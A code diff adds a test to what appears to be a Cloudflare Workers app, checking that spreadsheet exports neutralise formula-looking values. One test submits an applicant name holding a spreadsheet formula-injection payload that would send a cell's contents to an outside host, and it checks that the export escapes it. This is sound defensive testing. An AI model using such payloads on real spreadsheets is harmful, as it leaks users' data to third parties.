@@ -2,7 +2,7 @@ import { env, exports } from "cloudflare:workers";
 import { describe, expect, it } from "vitest";
 import { toPacific } from "../src/shared/time";
 import { toCsv } from "../src/worker/export";
-import { Client, ORIGIN, approveMember, createTestEvent, futureDate, setUpAdmin } from "./helpers";
+import { Client, ORIGIN, approveMember, createTestEvent, futureDate, joinBody, setUpAdmin } from "./helpers";
 
 const anon = new Client();
 const today = toPacific(new Date()).date;
@@ -129,5 +129,16 @@ describe("export", () => {
   it("quotes commas and neutralises spreadsheet formulas", () => {
     const csv = toCsv({ title: "t", columns: ["a", "b"], rows: [["x,y", "=HYPERLINK(1)"], [-5, '"q"']] });
     expect(csv).toBe('\uFEFFa,b\r\n"x,y",\'=HYPERLINK(1)\r\n-5,"""q"""\r\n');
+  });
+
+  it("keeps an applicant's formula-looking name as text in the Google Sheet export", async () => {
+    const ctx = await setUpAdmin();
+    await anon.call("/api/public/join", joinBody("Eve", '=IMAGE("//x.co/"&A1)'));
+    const { script } = (await ctx.admin.call(`${ctx.base}/sheets/enable`, {})).data;
+    const key = /const KEY = "([^"]+)"/.exec(script)![1]!;
+    const data = (await (await exports.default.fetch(`${ORIGIN}/export/${key}/all.json`)).json()) as any;
+    const eve = data.tables.members.rows.find((r: unknown[]) => r[1] === "Eve");
+    expect(eve[2]).toBe('\'=IMAGE("//x.co/"&A1)');
+    expect(eve[0]).toBe("M002");
   });
 });
